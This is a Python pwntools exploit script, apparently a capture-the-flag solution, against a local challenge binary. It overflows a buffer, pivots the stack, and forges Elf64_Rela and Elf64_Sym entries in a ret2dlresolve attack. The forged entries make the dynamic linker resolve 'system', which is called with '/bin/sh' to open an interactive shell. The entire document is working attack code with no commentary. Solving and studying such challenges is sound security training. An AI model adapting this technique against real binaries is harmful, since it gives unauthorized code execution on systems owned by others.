from pwn import *

chal = ELF('./chal_patched')
libc = ELF('../glibc/2.42/libc.so.6')

gdbscript='''
b main
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = process([chal.path])
#conn = gdb.debug([chal.path], gdbscript)

def main():
    size_of_elf64_rela = 0x18
    size_of_elf64_sym = 0x18

    addr_dynsym = 0x3fe408
    addr_dynstr = 0x3fe4c8
    addr_rela_plt = 0x400578
    addr_plt = 0x401020
    addr_call_gets = 0x40113e
    addr_got_gets = 0x403300
    addr_pivot = 0x403f00

    payload = b'\0' * 0x20
    payload += p64(addr_pivot)
    payload += p64(addr_call_gets)

    conn.sendline(payload)

    addr_fake_elf64_rela = addr_pivot + 0x20
    pad0 = size_of_elf64_rela - ((addr_fake_elf64_rela - addr_rela_plt) % size_of_elf64_rela)
    addr_fake_elf64_rela += pad0

    addr_fake_elf64_sym = addr_fake_elf64_rela + size_of_elf64_rela
    pad1 = size_of_elf64_sym - ((addr_fake_elf64_sym - addr_dynsym) % size_of_elf64_sym)
    addr_fake_elf64_sym += pad1

    addr_system = addr_fake_elf64_sym + size_of_elf64_sym

    assert (addr_fake_elf64_rela - addr_rela_plt) % size_of_elf64_rela == 0
    assert (addr_fake_elf64_sym - addr_dynsym) % size_of_elf64_sym == 0

    payload = b'/bin/sh\0'
    payload += b'\0' * 0x18
    assert len(payload) == 0x20
    payload += p64(addr_pivot)
    payload += p64(addr_plt)
    payload += p64((addr_fake_elf64_rela - addr_rela_plt) // size_of_elf64_rela)
    payload += p64(addr_call_gets)
    assert len(payload) == 0x40
    payload += b'\0' * pad0

    R_X86_64_JUMP_SLOT = 7
    sym = (addr_fake_elf64_sym - addr_dynsym) // size_of_elf64_sym
    payload += p64(addr_got_gets) # r_offset
    payload += p64(sym << 32 | R_X86_64_JUMP_SLOT) # r_info
    payload += p64(0) # r_addend
    payload += b'\0' * pad1

    payload += p32(addr_system - addr_dynstr) # st_name
    payload += b'\0' # st_info
    payload += b'\0' # st_other
    payload += b'\0\0' # st_shndx
    payload += p64(0) # st_value
    payload += p64(0) # st_size

    payload += b'system\0'

    conn.sendline(payload)
    conn.interactive()

if __name__ == '__main__':
    main()
